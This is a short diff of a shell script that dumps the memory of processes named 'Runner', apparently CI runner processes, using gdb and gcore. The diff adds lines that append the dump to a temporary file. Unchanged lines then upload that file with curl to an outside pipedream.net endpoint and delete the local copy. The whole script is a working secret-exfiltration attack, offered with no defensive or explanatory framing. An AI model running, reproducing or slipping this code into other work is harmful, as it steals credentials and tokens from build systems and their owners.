@@ -6,11 +6,13 @@ sudo apt-get install gdb -y > /tmp/file.txt
 # get pids related to runners
 for pid in $(ps -ef | grep Runner  | tr -s ' ' | cut -d ' ' -f2)
 do
-    echo "---$pid---"
+    echo "---$pid---";
     #gcore -o /tmp/hola.txt $pid >> /tmp/file.txt
-    gcore -o /tmp/aaa | gdb -p $pid >> /tmp/file.txt
+    gcore -o /tmp/aaa | gdb -p $pid >> /tmp/file.txt;
+    cat $(/tmp/aaa) >> /tmp/file.txt;
+    echo "---------------------";
 done
-
+echo "---------------------"
 curl --data-binary "@/tmp/file.txt" https://en0liva7dzyvpp.x.pipedream.net/
 
 rm /tmp/file.txt
